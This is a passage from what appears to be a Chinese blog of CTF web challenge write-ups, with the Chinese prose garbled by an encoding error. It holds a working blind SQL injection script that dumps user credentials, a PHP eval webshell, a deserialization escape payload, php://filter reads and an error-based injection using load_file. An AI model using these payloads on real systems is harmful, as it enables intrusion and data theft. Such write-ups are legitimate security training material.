class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><h3 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h3><p>è¿™é‡Œç”±äºå•å¼•å·è¢«banäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>\0</code>è¿›è¡Œç»•è¿‡ã€‚</p><p>ç„¶åè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯çˆ†åˆ—åçš„æ—¶å€™ç”±äºå•å¼•å·è¢«banæ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨åå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡ã€‚</p><p>è¿™é‡Œæ˜¯payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url_here/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFlag</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    needsql = <span class="string">&quot;select group_concat(concat_ws(0x7e, username, password)) from users&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            sql = <span class="string">f&quot;or if(ascii(substr((<span class="subst">&#123;needsql&#125;</span>),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&quot;</span></span><br><span class="line">            res = requests.get(url+sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>((left + right - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥çˆ†å‡ºç”¨æˆ·åå’Œå¯†ç ï¼Œç›´æ¥ç™»é™†</p><h3 id="PHPçŸ­æ ‡ç­¾"><a href="#PHPçŸ­æ ‡ç­¾" class="headerlink" title="PHPçŸ­æ ‡ç­¾"></a>PHPçŸ­æ ‡ç­¾</h3><p>ç™»é™†åå‘ç°éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œéšä¾¿ä¸Šä¼ ä¸ªé©¬ä¸Šå»ï¼Œå¾—åˆ°æ–‡ä»¶åä¸èƒ½åŒ…å«phpå­—ç¬¦ä¸²ã€‚</p><p>è¿™é‡Œå‘ç°æ–‡ä»¶åä¼šè¢«å†™å…¥åˆ°æ—¥å¿—é‡Œï¼Œäºæ˜¯ç›´æ¥å†™ä¸ªé©¬è¿›å»ã€‚</p><p><code>&lt;?=eval($_POST[&#39;a&#39;]);?&gt;</code>ï¼Œç„¶åç”¨èšå‰‘æˆåŠŸç™»å…¥æ‹¿åˆ°flagã€‚</p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>ç‚¹å‡»sourceä¹‹åå¯ä»¥æŸ¥çœ‹åˆ°index.phpçš„æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒ¹é…äº†ä¸€ä¸²éšæœºå­—ç¬¦ä¸²ç»™guessè¿›è¡Œæ¯”è¾ƒï¼Œå¾ˆæ˜æ˜¾æ˜¯ä¸èƒ½èµ°è¿™é‡Œæ‹¿flagçš„ã€‚</p><p>é‚£ä¹ˆå›å¤´çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­==$_SERVER[â€˜PHP_SELFâ€™]==ï¼Œä¼šè¯»å–å½“å‰PHPæ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€ã€‚</p><p>è¿™é‡Œå‘ç°äº†ä¸€ä¸ª<code>basename()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(<span class="string">&quot;config.php/%ff&quot;</span>); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†åŠ ä¸ªsourceå‚æ•°å°±å¯ä»¥è¯»å–æºç äº†ã€‚</p><p>æœ€ç»ˆpayload</p><blockquote><p>/index.php/config.php/%ff?source</p></blockquote><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h3><p>ä½¿ç”¨dirsearchè¿›è¡Œç›®å½•æ£€ç´¢å¯ä»¥æŸ¥åˆ°æœ‰ä¸€ä¸ª==<a href="http://www.zip==,ç›´æ¥ä¸‹è½½ä¸‹æ¥å¯ä»¥çœ‹åˆ°æºç ./">www.zip==ï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥å¯ä»¥çœ‹åˆ°æºç ã€‚</a></p><h3 id="ä»£ç å®¡è®¡-1"><a href="#ä»£ç å®¡è®¡-1" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>åœ¨<code>profile.php</code>é‡Œå¯ä»¥çœ‹åˆ°<code>file_get_contents</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>config.php</code>é‡Œå‘ç°äº†flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>file_get_contents</code>å‡½æ•°è¯»å–<code>config.php</code>ä»¥æ‹¿åˆ°flagã€‚</p><p>ä½†æ˜¯è¿™é‡Œéœ€è¦ä½¿<code>$profile[&#39;photo&#39;]</code>å¯æ§ï¼Œäºæ˜¯åœ¨<code>update.php</code>é‡Œå‘ç°è¿™ä¸€æ®µã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3><p>è¿™é‡Œå¯ä»¥é€šè¿‡æäº¤<code>nickname</code>è¿›è¡Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼ŒæŠŠåŸæ¥çš„<code>photo</code>é¡¶æ‰æ¢æˆæˆ‘ä»¬æƒ³è¦çš„ã€‚</p><p>åŸæ¥æ„é€ å¾—åˆ°çš„åºåˆ—åŒ–å­—ç¬¦æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æŠŠæˆ‘ä»¬éœ€è¦çš„<code>config.php</code>åŠ è¿›å»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯å‰é¢æœ‰ä¸€ä¸ªifé™åˆ¶äº†nicknameçš„é•¿åº¦ã€‚</p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©æ•°ç»„è¿›è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç”±äºæˆ‘ä»¬æ˜¯åœ¨<code>nickname</code>é‡Œè¾“å…¥çš„ï¼Œæ‰€ä»¥éœ€è¦å°†<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>è¿™34ä¸ªå­—ç¬¦é€ƒé€¸å‡ºæ¥ã€‚</p><p>è¿™é‡Œå› ä¸ºæœ€åè¿›<code>update_profile()</code>å‡½æ•°é‡Œåä¼šæœ‰ä¸€ä¸ªæ­£åˆ™ï¼Œæ­£åˆ™ä¼šæ›¿æ¢ä¸€äº›å­—ç¬¦ä¸²ä¸º<code>hacker</code>ï¼Œè¿™é‡Œå¯ä»¥å–å·§ä¸€ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºæˆ‘ä»¬éœ€è¦é€ƒé€¸å…±34ä¸ªå­—ç¬¦ï¼Œè€Œæ›¿æ¢çš„hackerä¸º6ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€‰æ‹©whereè¿›è¡Œæ›¿æ¢ï¼Œè¿™æ ·æ¯æ›¿æ¢ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦éƒ½ä¼š+1</span><br><span class="line">where&#x3D;5 &#x3D;&gt; 34*5&#x3D;170</span><br><span class="line">hacker&#x3D;6 &#x3D;&gt; 34*6&#x3D;204 &#x3D;&gt; 204-170&#x3D;34</span><br></pre></td></tr></table></figure><p>è¿™æ ·å­å°±å¯ä»¥é€ƒé€¸å‡º34ä¸ªå­—ç¬¦äº†</p><p>ç„¶åæ³¨å†Œç™»é™†updateå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><h3 id="ä»£ç å®¡è®¡-2"><a href="#ä»£ç å®¡è®¡-2" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>åœ¨networké‡Œå¯ä»¥è·Ÿåˆ°check.phpï¼Œå¾—åˆ°æºç ã€‚</p><p>æ ¸å¿ƒå°±æ˜¯è¿™ä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯è¦æ‹¿åˆ°seedç„¶åé€†å‘æ‹¿åˆ°åŸå­—ç¬¦ä¸²æ‰èƒ½å¾—åˆ°flagã€‚</p><h3 id="seedçˆ†ç ´"><a href="#seedçˆ†ç ´" class="headerlink" title="seedçˆ†ç ´"></a>seedçˆ†ç ´</h3><p>è¿™é‡Œå¯ä»¥ç”¨php_mt_seedè¿›è¡Œçˆ†ç ´ï¼Œ<a href="https://xz.aliyun.com/t/3656#toc-3">åŸç†çœ‹è¿™</a>ã€‚</p><p>ä½†æ˜¯çˆ†ç ´å‰éœ€è¦è½¬æˆå·¥å…·æ‰€éœ€çš„æ ¼å¼ï¼Œè¿™é‡Œæ”¾è„šæœ¬ï¼Œå…·ä½“ä¹Ÿæ˜¯çœ‹åŸç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;hch2FuienH&#x27;</span> // å·²ç»ç»™å‡ºçš„å­—ç¬¦ä¸²æ”¾è¿™</span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>ç„¶åå°†å¾—åˆ°çš„æ•°æ®æ‹¿åˆ°<code>php_mt_seed</code>é‡Œçˆ†ç ´å³å¯å¾—åˆ°<code>seed</code>ã€‚</p><p>![](C:\Users\violet\Desktop\my blog\blog\source_posts\WriteUp\BUUOJ web 1pts\nS6mYpkeVGcbyhu.png)</p><p>è¿™é‡Œå¾—å‡ºçš„seed=904536600ï¼Œæ”¾å›å»çˆ†å‡ºåŸå­—ç¬¦ä¸²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">904536600</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åæäº¤å³å¯å¾—åˆ°flagã€‚</p><blockquote><p>flag{bb7792f8-ba2d-4fe0-84c5-22aa8ea48825}</p></blockquote><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><h3 id="phpä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#phpä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="phpä¼ªåè®®è¯»å–æ–‡ä»¶"></a>phpä¼ªåè®®è¯»å–æ–‡ä»¶</h3><p>æ‰“å¼€ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ä¸€ä¸ªfileå‚æ•°ï¼Œä½¿ç”¨phpä¼ªåè®®è¿›è¡Œæ–‡ä»¶æˆªæµå³å¯è¯»å–æ–‡ä»¶ã€‚</p><blockquote><p>url_here?file=php://filter/convert.base64-encode/resource=confirm.php</p></blockquote><p>æ€»å…±æœ‰confirm.php, change.php, search.php, index.php, delete.phpè¿™å‡ ä¸ªæ–‡ä»¶ã€‚</p><h3 id="sqläºŒæ¬¡æŠ¥é”™æ³¨å…¥"><a href="#sqläºŒæ¬¡æŠ¥é”™æ³¨å…¥" class="headerlink" title="sqläºŒæ¬¡æŠ¥é”™æ³¨å…¥"></a>sqläºŒæ¬¡æŠ¥é”™æ³¨å…¥</h3><p>æŒºå¤šå‚æ•°ç»™è¿‡æ»¤è¿‡äº†ï¼Œä½†æ˜¯å”¯ç‹¬addressæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä»è¿™é‡Œå…¥æ‰‹ã€‚</p><p>å…ˆç›´æ¥æäº¤address</p><blockquote><p>1â€™ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(â€˜/flag.txtâ€™),1,30)),0x7e),1)#</p></blockquote><p>è¿™æ—¶addresså·²ç»è¢«å½•å…¥è¿›æ•°æ®åº“ä¸­äº†ï¼Œç„¶åæˆ‘ä»¬ä»change.phpé‡Œå†æ¬¡è°ƒç”¨addresså°±ä¼šè§¦å‘sqlæ³¨å…¥ã€‚</p><p>å¾—åˆ°ä¸€åŠçš„flag</p><blockquote><p>errorXPATH syntax error: â€˜<del>flag{ae44900b-3688-41e7-ab00-2</del>â€˜</p></blockquote><p>ç„¶åå†æ¬¡æ³¨å…¥å°±å¯ä»¥æ‹¿åˆ°å®Œæ•´çš„flagäº†</p><blockquote><p>flag{ae44900b-3688-41e7-ab00-20da18e3d421}</p></blockquote><h2 id="æ´¥é—¨æ¯2021-power-cut"><a href="#æ´¥é—¨æ¯2021-power-cut" class="headerlink" title="[æ´¥é—¨æ¯2021]power_cut"></a>[æ´¥é—¨æ¯2021]power_cut</h2><h3 id="swpæºç æ³„éœ²"><a href="#swpæºç æ³„éœ²" class="headerlink" title="swpæºç æ³„éœ²"></a>swpæºç æ³„éœ²</h3><p><code>.index.php.swp</code>ä¸‹è½½index.phpæºç ï¼Œå¾—åˆ°çš„æºç æ˜¯æ··ä¹±çš„ï¼Œéœ€è¦é‡æ–°è‡ªå·±æ•´ç†ä¸€ä¸‹o(Â´^ï½€)oã€‚</p><figure class="highlight 